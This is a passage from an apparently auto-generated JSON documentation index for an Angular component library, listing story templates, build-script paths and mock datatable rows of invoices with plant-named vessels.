            "defaultValue": "[\r\n  {\r\n    label: 'Direct route',\r\n    route: [ '/', 'home' ],\r\n    icon: 'home'\r\n  },\r\n  {\r\n    label: 'Internal route title',\r\n    children: [\r\n      {\r\n        route: [ '/', 'route1' ],\r\n        label: 'Internal child route',\r\n      },\r\n      {\r\n        route: [ '/', 'route2' ],\r\n        label: 'Internal child route 2',\r\n      },\r\n      {\r\n        route: [ '/', 'route3' ],\r\n        label: 'Internal child route 3',\r\n      },\r\n      {\r\n        route: [ '/', 'route4' ],\r\n        label: 'Internal child route 4',\r\n      },\r\n      {\r\n        route: [ '/', 'route5' ],\r\n        label: 'Internal child route 5',\r\n      },\r\n      {\r\n        route: [ '/', 'route6' ],\r\n        label: 'Internal child route 6',\r\n      },\r\n    ],\r\n    icon: 'dashboard',\r\n    title: 'Dashboard'\r\n  },\r\n  {\r\n    label: 'External',\r\n    children: [\r\n      {\r\n        link: 'https://example.com',\r\n        target: '_blank',\r\n        label: 'Example.com'\r\n      }\r\n    ],\r\n    icon: 'open_in_new',\r\n  },\r\n  {\r\n    link: '#',\r\n    label: 'Disabled Route',\r\n    children: [],\r\n    icon: 'do_disturb',\r\n    disabled: true\r\n  },\r\n]"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoDatatableComponent<Record<string, >>>",
            "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\r\n  return {\r\n    component: StoDatatableComponent,\r\n    props: {\r\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\r\n      rows: rows,\r\n      headerContextMenu: action('Header context menu'),\r\n      rowContextMenu: action('Row context menu'),\r\n      rowActivate: action('Keyboard-activation on row'),\r\n      select: action('Row selected'),\r\n      resized: action('Resize')\r\n    },\r\n  };\r\n}"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/lib/error-handler.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n}"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "NormalUse",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "Template.bind({})"
          },
          {
            "name": "out",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/build-scss.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
          },
          {
            "name": "out",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/copy-assets.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
          },
          {
            "name": "overlayAnimation",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/animation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "trigger('overlay', [\r\n  transition(':enter', [\r\n    style({ opacity: 0 }),\r\n    animate('400ms', style({ opacity: 0.08 })),\r\n  ]),\r\n  transition(':leave', [\r\n    animate('400ms', style({ opacity: 0 }))\r\n  ])\r\n])"
          },
          {
            "name": "PADDING",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "defaultValue": "'000000000'"
          },
          {
            "name": "Paging",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story",
            "defaultValue": "(args) => ( {\r\n  props: {\r\n    page: action('Page change'),\r\n    setPage: (pageEvent: { pageIndex: number; }, that: { visibleRows: { total: unknown; invoiceNo: number; voyageNo: number; vesselName: string; allocated: number; }[]; }) => {\r\n      const startAt = pageEvent.pageIndex * 30;\r\n      const endAt = ( pageEvent.pageIndex + 1 ) * 30 - 1;\r\n      that.visibleRows = [ ...rows ].slice(startAt, endAt);\r\n    },\r\n    ...args\r\n  },\r\n  template: `\r\n<h3>Paging is done by using <a href=\"https://material.angular.io/components/paginator/overview\" target=\"_blank\">mat-paginator</a></h3>\r\n<mat-card class=\"sto-card\" (resize)=\"resize()\">\r\n<sto-datatable [virtualScroll]=\"false\" [height]=\"height\" [rows]=\"visibleRows\" [columns]=\"columns\">\r\n    <mat-paginator (page)=\"setPage($event, this); page($event)\" [showFirstLastButtons]=\"true\" [length]=\"rows.length\" [hidePageSize]=\"true\" [pageSize]=\"30\" [pageIndex]=\"activePage\"></mat-paginator>\r\n</sto-datatable>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "pipe",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/rows.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "new NumberFormatPipe()"
          },
          {
            "name": "preferenceKey",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "defaultValue": "'TOPS_IM:UserPreferences'"
          },
          {
            "name": "preferences",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Preference[]",
            "defaultValue": "[\r\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\r\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\r\n]"
          },
          {
            "name": "primary",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "apps/oilmod-web/src/app/app.component.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "() => ({\r\n  moduleMetadata: {\r\n    imports: []\r\n  },\r\n  props: {\r\n  }\r\n})"
          },
          {
            "name": "Primary",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"primary\" [dismissable]=\"false\" icon=\"info\">Primary Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "promises",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/build-scss.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\r\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\r\n]"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "require",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/test.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any"
          },
          {
            "name": "ResponsiveMode",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story",
            "defaultValue": "(args) => ( {\r\n  props: args,\r\n  template: `\r\n<h3>Responsive mode will make the grid break into a list, allowing for a simpler view</h3>\r\n<div [style.width.px]=\"emulateSmallElement ? breakpoint - 1 : 1000\">\r\n<sto-datatable [virtualScroll]=\"true\"\r\n[responsiveBreakPoint]=\"breakpoint\"\r\n[responsive]=\"true\"\r\n[responsiveView]=\"responsive\"\r\n[height]=\"400\"\r\n[rows]=\"rows\"\r\n[columns]=\"columns\"></sto-datatable>\r\n<ng-template #responsive let-row=\"row\">{{ row | json }}</ng-template>\r\n</div>`\r\n} )"
          },
          {
            "name": "root",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/build-scss.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(__dirname, '../../')"
          },
          {
            "name": "root",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/copy-assets.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(__dirname, '../../')"
          },
          {
            "name": "rows",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/rows.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "[\r\n  {\r\n    'invoiceNo': 212666588,\r\n    'voyageNo': 16206,\r\n    'vesselName': 'False Cloak Fern',\r\n    'allocated': 486958,\r\n    'total': 367817\r\n}, {\r\n    'invoiceNo': 209381561,\r\n    'voyageNo': 16897,\r\n    'vesselName': 'Weak Signalgrass',\r\n    'allocated': 435757,\r\n    'total': 306822\r\n}, {\r\n    'invoiceNo': 276445387,\r\n    'voyageNo': 16723,\r\n    'vesselName': 'Southern Red Oak',\r\n    'allocated': 434782,\r\n    'total': 304761\r\n}, {\r\n    'invoiceNo': 240525031,\r\n    'voyageNo': 17412,\r\n    'vesselName': 'Hollyleaf Buckthorn',\r\n    'allocated': 498118,\r\n    'total': 518295\r\n}, {\r\n    'invoiceNo': 208251845,\r\n    'voyageNo': 15732,\r\n    'vesselName': 'Western Sandparsley',\r\n    'allocated': 483548,\r\n    'total': 409397\r\n}, {\r\n    'invoiceNo': 244864110,\r\n    'voyageNo': 15313,\r\n    'vesselName': 'Kern Buckwheat',\r\n    'allocated': 413287,\r\n    'total': 374936\r\n}, {\r\n    'invoiceNo': 213639557,\r\n    'voyageNo': 17502,\r\n    'vesselName': 'Greenleaf Manzanita',\r\n    'allocated': 478124,\r\n    'total': 362754\r\n}, {\r\n    'invoiceNo': 255930079,\r\n    'voyageNo': 15029,\r\n    'vesselName': 'Blue Skullcap',\r\n    'allocated': 464448,\r\n    'total': 483236\r\n}, {\r\n    'invoiceNo': 204028785,\r\n    'voyageNo': 17325,\r\n    'vesselName': 'Coca',\r\n    'allocated': 412084,\r\n    'total': 319574\r\n}, {\r\n    'invoiceNo': 215898267,\r\n    'voyageNo': 17556,\r\n    'vesselName': 'Fendler\\'s Pennycress',\r\n    'allocated': 467666,\r\n    'total': 401105\r\n}, {\r\n    'invoiceNo': 283652560,\r\n    'voyageNo': 16693,\r\n    'vesselName': 'Densespike Blazing Star',\r\n    'allocated': 428117,\r\n    'total': 422318\r\n}, {\r\n    'invoiceNo': 261627486,\r\n    'voyageNo': 16742,\r\n    'vesselName': 'Texas Crab Apple',\r\n    'allocated': 445829,\r\n    'total': 389401\r\n}, {\r\n    'invoiceNo': 224657257,\r\n    'voyageNo': 17344,\r\n    'vesselName': 'Philodendron',\r\n    'allocated': 439503,\r\n    'total': 197357\r\n}, {\r\n    'invoiceNo': 287799672,\r\n    'voyageNo': 18559,\r\n    'vesselName': 'Knife Acacia',\r\n    'allocated': 457225,\r\n    'total': 152586\r\n}, {\r\n    'invoiceNo': 249855102,\r\n    'voyageNo': 17210,\r\n    'vesselName': 'Catnip Noseburn',\r\n    'allocated': 490793,\r\n    'total': 295054\r\n}, {\r\n    'invoiceNo': 217932979,\r\n    'voyageNo': 18294,\r\n    'vesselName': 'Brickellbush Goldenweed',\r\n    'allocated': 476987,\r\n    'total': 90357\r\n}, {\r\n    'invoiceNo': 287187542,\r\n    'voyageNo': 18123,\r\n    'vesselName': 'Threecornerjack',\r\n    'allocated': 436103,\r\n    'total': 98431\r\n}, {\r\n    'invoiceNo': 277359566,\r\n    'voyageNo': 17549,\r\n    'vesselName': 'Longleaf Isodendrion',\r\n    'allocated': 456456,\r\n    'total': 292117\r\n}, {\r\n    'invoiceNo': 250935681,\r\n    'voyageNo': 16429,\r\n    'vesselName': 'Purple False Gilyflower',\r\n    'allocated': 465653,\r\n    'total': 396830\r\n}, {\r\n    'invoiceNo': 261927204,\r\n    'voyageNo': 16524,\r\n    'vesselName': 'Nevada Pea',\r\n    'allocated': 411190,\r\n    'total': 393332\r\n}, {\r\n    'invoiceNo': 203826163,\r\n    'voyageNo': 17608,\r\n    'vesselName': 'Alaska Tall Bluebells',\r\n    'allocated': 487745,\r\n    'total': 273514\r\n}, {\r\n    'invoiceNo': 253006185,\r\n    'voyageNo': 17795,\r\n    'vesselName': 'Cupped Monolopia',\r\n    'allocated': 491265,\r\n    'total': 117277\r\n}, {\r\n    'invoiceNo': 212369622,\r\n    'voyageNo': 17867,\r\n    'vesselName': 'Small Rocklettuce',\r\n    'allocated': 408880,\r\n    'total': 530690\r\n}, {\r\n    'invoiceNo': 259555515,\r\n    'voyageNo': 16488,\r\n    'vesselName': 'Torchwood',\r\n    'allocated': 428843,\r\n    'total': 63208\r\n}, {\r\n    'invoiceNo': 209064476,\r\n    'voyageNo': 17957,\r\n    'vesselName': 'Saline Saltbush',\r\n    'allocated': 452602,\r\n    'total': 144560\r\n}, {\r\n    'invoiceNo': 246761266,\r\n    'voyageNo': 18253,\r\n    'vesselName': 'White Snakeroot',\r\n    'allocated': 485075,\r\n    'total': 133101\r\n}, {\r\n    'invoiceNo': 277989052,\r\n    'voyageNo': 15535,\r\n    'vesselName': 'Bayberry',\r\n    'allocated': 411595,\r\n    'total': 549473\r\n}, {\r\n    'invoiceNo': 246327302,\r\n    'voyageNo': 17427,\r\n    'vesselName': 'China Violet',\r\n    'allocated': 426753,\r\n    'total': 406017\r\n}, {\r\n    'invoiceNo': 225951335,\r\n    'voyageNo': 15473,\r\n    'vesselName': 'Olympic Saxifrage',\r\n    'allocated': 429650,\r\n    'total': 413380\r\n}, {\r\n    'invoiceNo': 206579573,\r\n    'voyageNo': 17600,\r\n    'vesselName': 'False Sun-rose',\r\n    'allocated': 464983,\r\n    'total': 474611\r\n}, {\r\n    'invoiceNo': 243806520,\r\n    'voyageNo': 15148,\r\n    'vesselName': 'Bracted Lousewort',\r\n    'allocated': 486907,\r\n    'total': 419416\r\n}, {\r\n    'invoiceNo': 248037555,\r\n    'voyageNo': 16554,\r\n    'vesselName': 'Beach Strawberry',\r\n    'allocated': 446762,\r\n    'total': 543982\r\n}, {\r\n    'invoiceNo': 233807782,\r\n    'voyageNo': 18251,\r\n    'vesselName': 'Western Bog Yellowcress',\r\n    'allocated': 485749,\r\n    'total': 206612\r\n}, {\r\n    'invoiceNo': 231399318,\r\n    'voyageNo': 18647,\r\n    'vesselName': 'Nevada Pea',\r\n    'allocated': 416624,\r\n    'total': 73797\r\n}, {\r\n    'invoiceNo': 210265421,\r\n    'voyageNo': 17334,\r\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\r\n    'allocated': 493556,\r\n    'total': 485404\r\n}, {\r\n    'invoiceNo': 270110020,\r\n    'voyageNo': 15750,\r\n    'vesselName': 'Dotted Lancepod',\r\n    'allocated': 439009,\r\n    'total': 85163\r\n}, {\r\n    'invoiceNo': 203365491,\r\n    'voyageNo': 15574,\r\n    'vesselName': 'Arizona Whitefeather',\r\n    'allocated': 424981,\r\n    'total': 72976\r\n}, {\r\n    'invoiceNo': 258026382,\r\n    'voyageNo': 17991,\r\n    'vesselName': 'Rough Blackfoot',\r\n    'allocated': 412805,\r\n    'total': 525915\r\n}, {\r\n    'invoiceNo': 216800989,\r\n    'voyageNo': 18938,\r\n    'vesselName': 'Narrowleaf Wirelettuce',\r\n    'allocated': 437679,\r\n    'total': 384426\r\n}, {\r\n    'invoiceNo': 224161270,\r\n    'voyageNo': 15475,\r\n    'vesselName': 'Utah Sweetvetch',\r\n    'allocated': 414735,\r\n    'total': 398700\r\n}, {\r\n    'invoiceNo': 224587536,\r\n    'voyageNo': 16133,\r\n    'vesselName': 'Palau Horsfieldia',\r\n    'allocated': 409836,\r\n    'total': 55599\r\n}, {\r\n    'invoiceNo': 200019644,\r\n    'voyageNo': 16430,\r\n    'vesselName': 'Cracked Lichen',\r\n    'allocated': 491135,\r\n    'total': 400179\r\n}, {\r\n    'invoiceNo': 212973644,\r\n    'voyageNo': 16527,\r\n    'vesselName': 'California Valerian',\r\n    'allocated': 465742,\r\n    'total': 428281\r\n}, {\r\n    'invoiceNo': 236726871,\r\n    'voyageNo': 15145,\r\n    'vesselName': 'Spear Saltbush',\r\n    'allocated': 420067,\r\n    'total': 236753\r\n}, {\r\n    'invoiceNo': 262498296,\r\n    'voyageNo': 16350,\r\n    'vesselName': 'Rose Globemallow',\r\n    'allocated': 472387,\r\n    'total': 270655\r\n}, {\r\n    'invoiceNo': 237959767,\r\n    'voyageNo': 18739,\r\n    'vesselName': 'Cithara Buckwheat',\r\n    'allocated': 447466,\r\n    'total': 358262\r\n}, {\r\n    'invoiceNo': 200461954,\r\n    'voyageNo': 18921,\r\n    'vesselName': 'Rough Potato',\r\n    'allocated': 425594,\r\n    'total': 459497\r\n}, {\r\n    'invoiceNo': 266033549,\r\n    'voyageNo': 16150,\r\n    'vesselName': 'Distictis',\r\n    'allocated': 447636,\r\n    'total': 286350\r\n}, {\r\n    'invoiceNo': 289893009,\r\n    'voyageNo': 18219,\r\n    'vesselName': 'Piedmont False Pimpernel',\r\n    'allocated': 474098,\r\n    'total': 163688\r\n}, {\r\n    'invoiceNo': 241320630,\r\n    'voyageNo': 15558,\r\n    'vesselName': 'Southern Mexican Sage',\r\n    'allocated': 431537,\r\n    'total': 419734\r\n}, {\r\n    'invoiceNo': 211404482,\r\n    'voyageNo': 18502,\r\n    'vesselName': 'Bearded Sprangletop',\r\n    'allocated': 458939,\r\n    'total': 89714\r\n}, {\r\n    'invoiceNo': 247917426,\r\n    'voyageNo': 18238,\r\n    'vesselName': 'Small-flowered Calycadenia',\r\n    'allocated': 406198,\r\n    'total': 351785\r\n}, {\r\n    'invoiceNo': 234633032,\r\n    'voyageNo': 17269,\r\n    'vesselName': 'Pritchardia',\r\n    'allocated': 442188,\r\n    'total': 414638\r\n}, {\r\n    'invoiceNo': 216477974,\r\n    'voyageNo': 15454,\r\n    'vesselName': 'Thread Lichen',\r\n    'allocated': 474232,\r\n    'total': 537142\r\n}, {\r\n    'invoiceNo': 201667786,\r\n    'voyageNo': 15130,\r\n    'vesselName': 'Margined Stickseed',\r\n    'allocated': 493253,\r\n    'total': 364145\r\n}, {\r\n    'invoiceNo': 271891491,\r\n    'voyageNo': 15468,\r\n    'vesselName': 'Eggleaf Milkwort',\r\n    'allocated': 457747,\r\n    'total': 316780\r\n}, {\r\n    'invoiceNo': 223744528,\r\n    'voyageNo': 16074,\r\n    'vesselName': 'Hall\\'s Mule-ears',\r\n    'allocated': 439241,\r\n    'total': 301239\r\n}, {\r\n    'invoiceNo': 202936481,\r\n    'voyageNo': 18868,\r\n    'vesselName': 'Rinodina Lichen',\r\n    'allocated': 488291,\r\n    'total': 504547\r\n}, {\r\n    'invoiceNo': 284610720,\r\n    'voyageNo': 17077,\r\n    'vesselName': 'Saber Bogmat',\r\n    'allocated': 417817,\r\n    'total': 246511\r\n}, {\r\n    'invoiceNo': 286535852,\r\n    'voyageNo': 15935,\r\n    'vesselName': 'Brodiaea',\r\n    'allocated': 479989,\r\n    'total': 276206\r\n}, {\r\n    'invoiceNo': 206000446,\r\n    'voyageNo': 17528,\r\n    'vesselName': 'Utah Serviceberry',\r\n    'allocated': 454837,\r\n    'total': 399887\r\n}, {\r\n    'invoiceNo': 283036494,\r\n    'voyageNo': 16899,\r\n    'vesselName': 'Lehua Makanoe',\r\n    'allocated': 452547,\r\n    'total': 96023\r\n}, {\r\n    'invoiceNo': 270371913,\r\n    'voyageNo': 16886,\r\n    'vesselName': 'Rim Lichen',\r\n    'allocated': 439082,\r\n    'total': 269557\r\n}, {\r\n    'invoiceNo': 273513209,\r\n    'voyageNo': 15570,\r\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\r\n    'allocated': 471494,\r\n    'total': 131750\r\n}, {\r\n    'invoiceNo': 215244773,\r\n    'voyageNo': 17618,\r\n    'vesselName': 'Lesser Pond Sedge',\r\n    'allocated': 472422,\r\n    'total': 505921\r\n}, {\r\n    'invoiceNo': 264815411,\r\n    'voyageNo': 17008,\r\n    'vesselName': 'Browne\\'s Savory',\r\n    'allocated': 464834,\r\n    'total': 420180\r\n}, {\r\n    'invoiceNo': 260793904,\r\n    'voyageNo': 18868,\r\n    'vesselName': 'Bastard Copperleaf',\r\n    'allocated': 403983,\r\n    'total': 190831\r\n}, {\r\n    'invoiceNo': 228919503,\r\n    'voyageNo': 16736,\r\n    'vesselName': 'Himalayan Cypress',\r\n    'allocated': 418664,\r\n    'total': 450233\r\n}, {\r\n    'invoiceNo': 225534860,\r\n    'voyageNo': 18374,\r\n    'vesselName': 'Fiddleleaf Hawksbeard',\r\n    'allocated': 495477,\r\n    'total': 528500\r\n}, {\r\n    'invoiceNo': 205039289,\r\n    'voyageNo': 15221,\r\n    'vesselName': 'Maui Cyanea',\r\n    'allocated': 434081,\r\n    'total': 79021\r\n}, {\r\n    'invoiceNo': 219730920,\r\n    'voyageNo': 18931,\r\n    'vesselName': 'Garden Sorrel',\r\n    'allocated': 442584,\r\n    'total': 193166\r\n}, {\r\n    'invoiceNo': 229994865,\r\n    'voyageNo': 16404,\r\n    'vesselName': 'Waialeale Dubautia',\r\n    'allocated': 414377,\r\n    'total': 195495\r\n}, {\r\n    'invoiceNo': 289807557,\r\n    'voyageNo': 16151,\r\n    'vesselName': 'Onetooth Woodfern',\r\n    'allocated': 415673,\r\n    'total': 202974\r\n}, {\r\n    'invoiceNo': 289750833,\r\n    'voyageNo': 15827,\r\n    'vesselName': 'Greenland Orange Lichen',\r\n    'allocated': 416432,\r\n    'total': 146021\r\n}, {\r\n    'invoiceNo': 243948439,\r\n    'voyageNo': 18154,\r\n    'vesselName': 'Leafy Reedgrass',\r\n    'allocated': 441439,\r\n    'total': 248631\r\n}, {\r\n    'invoiceNo': 266718010,\r\n    'voyageNo': 15322,\r\n    'vesselName': 'Largeleaf Marshpennywort',\r\n    'allocated': 436736,\r\n    'total': 256997\r\n}, {\r\n    'invoiceNo': 285338933,\r\n    'voyageNo': 18884,\r\n    'vesselName': 'Musk Okra',\r\n    'allocated': 414918,\r\n    'total': 475276\r\n}, {\r\n    'invoiceNo': 284544908,\r\n    'voyageNo': 16825,\r\n    'vesselName': 'Stegonia Moss',\r\n    'allocated': 486396,\r\n    'total': 210718\r\n}, {\r\n    'invoiceNo': 200951860,\r\n    'voyageNo': 15681,\r\n    'vesselName': 'Black Rock Townsend Daisy',\r\n    'allocated': 437133,\r\n    'total': 358340\r\n}, {\r\n    'invoiceNo': 248838992,\r\n    'voyageNo': 18254,\r\n    'vesselName': 'Kern Canyon Clarkia',\r\n    'allocated': 414245,\r\n    'total': 164454\r\n}, {\r\n    'invoiceNo': 274109340,\r\n    'voyageNo': 18252,\r\n    'vesselName': 'Squarrose Knapweed',\r\n    'allocated': 408814,\r\n    'total': 159690\r\n}, {\r\n    'invoiceNo': 219721177,\r\n    'voyageNo': 16331,\r\n    'vesselName': 'Lake County Dwarf-flax',\r\n    'allocated': 496150,\r\n    'total': 404922\r\n}, {\r\n    'invoiceNo': 272212685,\r\n    'voyageNo': 15395,\r\n    'vesselName': 'Ferngrass',\r\n    'allocated': 432853,\r\n    'total': 191127\r\n}, {\r\n    'invoiceNo': 243182762,\r\n    'voyageNo': 18321,\r\n    'vesselName': 'Marsh Grass',\r\n    'allocated': 462472,\r\n    'total': 452940\r\n}, {\r\n    'invoiceNo': 277839539,\r\n    'voyageNo': 17421,\r\n    'vesselName': 'Prairie Straw Sedge',\r\n    'allocated': 406837,\r\n    'total': 271284\r\n}, {\r\n    'invoiceNo': 207952597,\r\n    'voyageNo': 17197,\r\n    'vesselName': 'Doublehorn Calicoflower',\r\n    'allocated': 477735,\r\n    'total': 400959\r\n}, {\r\n    'invoiceNo': 260636315,\r\n    'voyageNo': 15453,\r\n    'vesselName': 'Palmer\\'s Goldenrod',\r\n    'allocated': 450419,\r\n    'total': 309897\r\n}, {\r\n    'invoiceNo': 256449906,\r\n    'voyageNo': 15189,\r\n    'vesselName': 'Oregon Checkerbloom',\r\n    'allocated': 435139,\r\n    'total': 139814\r\n}, {\r\n    'invoiceNo': 230023430,\r\n    'voyageNo': 15665,\r\n    'vesselName': 'Duckweed',\r\n    'allocated': 449282,\r\n    'total': 209512\r\n}, {\r\n    'invoiceNo': 226217229,\r\n    'voyageNo': 18462,\r\n    'vesselName': 'Disc Lichen',\r\n    'allocated': 471214,\r\n    'total': 58962\r\n}, {\r\n    'invoiceNo': 239201753,\r\n    'voyageNo': 18676,\r\n    'vesselName': 'Antifever Fontinalis Moss',\r\n    'allocated': 456585,\r\n    'total': 146024\r\n}, {\r\n    'invoiceNo': 235303844,\r\n    'voyageNo': 16223,\r\n    'vesselName': 'Miracle Fruit',\r\n    'allocated': 467877,\r\n    'total': 150931\r\n}, {\r\n    'invoiceNo': 217943418,\r\n    'voyageNo': 15418,\r\n    'vesselName': 'Little Gumweed',\r\n    'allocated': 494402,\r\n    'total': 355363\r\n}, {\r\n    'invoiceNo': 289788898,\r\n    'voyageNo': 15038,\r\n    'vesselName': 'Parish\\'s Oxytheca',\r\n    'allocated': 464853,\r\n    'total': 472823\r\n}, {\r\n    'invoiceNo': 280499130,\r\n    'voyageNo': 18914,\r\n    'vesselName': 'Jelly Lichen',\r\n    'allocated': 486477,\r\n    'total': 522679\r\n}, {\r\n    'invoiceNo': 223812339,\r\n    'voyageNo': 18298,\r\n    'vesselName': 'Evermann\\'s Fleabane',\r\n    'allocated': 453418,\r\n    'total': 50034\r\n}, {\r\n    'invoiceNo': 226331833,\r\n    'voyageNo': 17046,\r\n    'vesselName': 'Munj Sweetcane',\r\n    'allocated': 442239,\r\n    'total': 447072\r\n}, {\r\n    'invoiceNo': 226842057,\r\n    'voyageNo': 16491,\r\n    'vesselName': 'Trichostomum Moss',\r\n    'allocated': 450732,\r\n    'total': 471203\r\n}, {\r\n    'invoiceNo': 218377093,\r\n    'voyageNo': 18157,\r\n    'vesselName': 'Brown Stringybark',\r\n    'allocated': 441668,\r\n    'total': 464837\r\n}, {\r\n    'invoiceNo': 282690677,\r\n    'voyageNo': 16864,\r\n    'vesselName': 'Whorled Milkwort',\r\n    'allocated': 424456,\r\n    'total': 241177\r\n  }]\r\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
          },
          {
            "name": "rows",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/testing/utils.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "[]",
            "defaultValue": "[\r\n  {\r\n    invoiceNo: 212666588,\r\n    voyageNo: 16206,\r\n    vesselName: 'False Cloak Fern',\r\n    allocated: 486958,\r\n    total: 367817\r\n  }, {\r\n    invoiceNo: 209381561,\r\n    voyageNo: 16897,\r\n    vesselName: 'Weak Signalgrass',\r\n    allocated: 435757,\r\n    total: 306822\r\n  }, {\r\n    invoiceNo: 276445387,\r\n    voyageNo: 16723,\r\n    vesselName: 'Southern Red Oak',\r\n    allocated: 434782,\r\n    total: 304761\r\n  }, {\r\n    invoiceNo: 240525031,\r\n    voyageNo: 17412,\r\n    vesselName: 'Hollyleaf Buckthorn',\r\n    allocated: 498118,\r\n    total: 518295\r\n  }, {\r\n    invoiceNo: 208251845,\r\n    voyageNo: 15732,\r\n    vesselName: 'Western Sandparsley',\r\n    allocated: 483548,\r\n    total: 409397\r\n  }, {\r\n    invoiceNo: 244864110,\r\n    voyageNo: 15313,\r\n    vesselName: 'Kern Buckwheat',\r\n    allocated: 413287,\r\n    total: 374936\r\n  }, {\r\n    invoiceNo: 213639557,\r\n    voyageNo: 17502,\r\n    vesselName: 'Greenleaf Manzanita',\r\n    allocated: 478124,\r\n    total: 362754\r\n  }, {\r\n    invoiceNo: 255930079,\r\n    voyageNo: 